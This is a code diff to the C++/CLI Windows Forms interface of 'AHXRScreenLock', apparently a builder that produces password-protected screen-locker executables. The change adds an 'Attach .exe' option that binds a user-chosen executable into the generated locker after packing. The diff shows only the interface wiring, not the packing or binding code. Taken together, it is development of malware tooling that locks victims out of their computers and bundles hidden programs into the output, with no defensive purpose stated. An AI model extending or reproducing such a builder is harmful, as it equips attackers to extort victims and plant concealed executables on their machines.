@@ -65,6 +65,8 @@ namespace AHXRScreenLock {
 	private: System::Windows::Forms::Button^  btnBuild;
 	private: System::Windows::Forms::SaveFileDialog^  saveFileDialog;
 	private: System::Windows::Forms::ProgressBar^  pgBar;
+	private: System::Windows::Forms::OpenFileDialog^  attachDialog;
+	private: System::Windows::Forms::Button^  btnAttach;
 
 
 	private:
@@ -88,6 +90,8 @@ namespace AHXRScreenLock {
 			this->btnBuild = (gcnew System::Windows::Forms::Button());
 			this->saveFileDialog = (gcnew System::Windows::Forms::SaveFileDialog());
 			this->pgBar = (gcnew System::Windows::Forms::ProgressBar());
+			this->attachDialog = (gcnew System::Windows::Forms::OpenFileDialog());
+			this->btnAttach = (gcnew System::Windows::Forms::Button());
 			this->grpPassword->SuspendLayout();
 			this->grpMessage->SuspendLayout();
 			this->SuspendLayout();
@@ -148,7 +152,7 @@ namespace AHXRScreenLock {
 			// 
 			this->btnBuild->Location = System::Drawing::Point(13, 137);
 			this->btnBuild->Name = L"btnBuild";
-			this->btnBuild->Size = System::Drawing::Size(437, 23);
+			this->btnBuild->Size = System::Drawing::Size(332, 23);
 			this->btnBuild->TabIndex = 2;
 			this->btnBuild->Text = L"Build";
 			this->btnBuild->UseVisualStyleBackColor = true;
@@ -167,11 +171,28 @@ namespace AHXRScreenLock {
 			this->pgBar->Size = System::Drawing::Size(436, 23);
 			this->pgBar->TabIndex = 3;
 			// 
+			// attachDialog
+			// 
+			this->attachDialog->FileName = L"openFileDialog1";
+			this->attachDialog->Filter = L"exe files|*.exe";
+			this->attachDialog->FileOk += gcnew System::ComponentModel::CancelEventHandler(this, &frmMain::attachDialog_FileOk);
+			// 
+			// btnAttach
+			// 
+			this->btnAttach->Location = System::Drawing::Point(351, 137);
+			this->btnAttach->Name = L"btnAttach";
+			this->btnAttach->Size = System::Drawing::Size(92, 23);
+			this->btnAttach->TabIndex = 4;
+			this->btnAttach->Text = L"Attach .exe";
+			this->btnAttach->UseVisualStyleBackColor = true;
+			this->btnAttach->Click += gcnew System::EventHandler(this, &frmMain::btnAttach_Click);
+			// 
 			// frmMain
 			// 
 			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
 			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
 			this->ClientSize = System::Drawing::Size(461, 204);
+			this->Controls->Add(this->btnAttach);
 			this->Controls->Add(this->pgBar);
 			this->Controls->Add(this->btnBuild);
 			this->Controls->Add(this->grpMessage);
@@ -204,9 +225,20 @@ namespace AHXRScreenLock {
 		buildNewLocker(s_file);
 		this->pgBar->Value = 65;
 		packLocker(s_file, marshal_as< std::string >(this->txtPassword->Text), marshal_as< std::string >(this->txtMessage->Text));
+		this->pgBar->Value = 80;
+		if ( !s_attached_p.empty() ) {
+			attachExecutable(s_file, s_attached_p);
+		}
+
 		this->pgBar->Value = 100;
 
 		MessageBox::Show("Done");
 	}
+private: System::Void btnAttach_Click(System::Object^  sender, System::EventArgs^  e) {
+	this->attachDialog->ShowDialog();
+}
+private: System::Void attachDialog_FileOk(System::Object^  sender, System::ComponentModel::CancelEventArgs^  e) {
+	s_attached_p = marshal_as< std::string >(this->attachDialog->FileName);
+}
 };
 }
